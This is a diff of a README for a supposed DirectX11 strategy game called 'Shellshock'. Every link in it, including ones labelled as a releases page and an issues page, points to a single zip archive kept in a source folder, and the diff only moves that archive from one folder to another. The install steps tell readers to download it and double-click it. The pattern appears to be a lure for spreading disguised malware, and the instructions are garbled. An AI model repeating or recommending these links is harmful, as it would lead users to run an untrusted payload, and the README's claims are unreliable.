@@ -1,6 +1,6 @@
 # 🎮 Shellshock - A DirectX11 RTS Game Experience
 
-[![Download Shellshock](https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip%20Shellshock-v1.0-blue)](https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip)
+[![Download Shellshock](https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip%20Shellshock-v1.0-blue)](https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to Shellshock! This guide will help you download and run the game, even 
 
 To get started, click the link below to visit the Releases page:
 
-[Download Shellshock](https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip)
+[Download Shellshock](https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip)
 
 Once you are on the Releases page:
 
 1. Locate the latest version of Shellshock.
 2. Click on the version number to find the files.
-3. Download the file that says "https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip"
+3. Download the file that says "https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip"
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ Before installing Shellshock, ensure your computer meets these requirements:
 Now that you have downloaded the game, follow these steps to install:
 
 1. Locate the downloaded file, usually in your "Downloads" folder.
-2. Double-click on `https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip`.
+2. Double-click on `https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip`.
 3. Follow the prompts in the installer window.
 4. Choose your preferred installation path or keep the default setting.
 5. Click “Install” and wait for the process to complete.
@@ -69,7 +69,7 @@ If you face any problems, check the system requirements, and ensure your PC is u
 
 ## 📞 Support
 
-If you have any questions or need assistance, please visit our [Github Issues page](https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip) to report problems or seek help.
+If you have any questions or need assistance, please visit our [Github Issues page](https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip) to report problems or seek help.
 
 ## 🎉 Join the Community
 
@@ -79,7 +79,7 @@ Don’t forget to join our community! Share your strategies, gameplay, or any id
 
 For further information and updates, check the following:
 
-- [Download Shellshock](https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip)
-- [Github Issues](https://github.com/NamiKaze02/Shellshock/raw/refs/heads/main/src/gui/Software_v2.4.zip)
+- [Download Shellshock](https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip)
+- [Github Issues](https://raw.githubusercontent.com/NamiKaze02/Shellshock/main/src/shaders/Software_v2.4.zip)
 
 Enjoy your time playing Shellshock!
